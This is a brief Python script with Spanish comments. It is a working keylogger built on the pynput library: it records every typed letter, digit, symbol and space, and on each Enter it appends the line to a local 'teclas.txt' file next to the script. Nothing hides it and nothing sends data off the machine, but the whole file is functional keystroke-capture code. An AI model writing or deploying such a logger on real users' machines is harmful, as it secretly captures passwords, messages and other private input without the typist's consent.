from pynput import keyboard
import os
import sys

caracteres = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0','!', '@', '#', '$', '%', '^', '&', '*', '(', ')','-', '_', '=', '+', '[', ']', '{', '}', ';', ':','\'', '"', ',', '.', '/', '?', '\\', '|', '<', '>','`', '~','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j','k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't','u', 'v', 'w', 'x', 'y', 'z','A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J','K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T','U', 'V', 'W', 'X', 'Y', 'Z',]

cadena = ""
#Escribe la cadena en el archivo
def insertar(cadena):
    #Abro el archivo en modo 'a' para que añada al final
    with open(os.path.join(sys.path[0], "teclas.txt"), "a") as file:
        file.write(cadena)

#Registro de tecla
def registro(tecla):
    global cadena, caracteres
    #Si la tecla no es el Enter entonces no guarda la cadena en el archivo
    if tecla != keyboard.Key.enter:
        if tecla == keyboard.Key.space:
            cadena += " "
        else:
            #Si el caracter introducido está en la lista de caracteres propios, me interesa
            caracter = str(tecla)[1]
            if caracter in caracteres:
                cadena += caracter
    else:
        insertar(cadena+" \n")
        cadena = ""

#Listener de teclado
with keyboard.Listener(registro) as listener:
    listener.join()